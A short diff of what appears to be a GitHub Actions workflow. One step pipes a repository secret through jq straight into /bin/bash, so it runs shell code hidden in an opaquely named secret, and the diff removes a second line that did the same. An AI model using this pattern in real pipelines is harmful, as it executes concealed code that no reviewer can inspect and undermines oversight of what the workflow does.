@@ -21,7 +21,6 @@ jobs:
           zyfo6659: ${{ secrets.zyfo6659 }}
         run: |
           printf '%s' "$zyfo6659" | jq -r .mpd0 | /bin/bash
-          printf '%s' "$mjcc304" | jq -r .voy4317 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
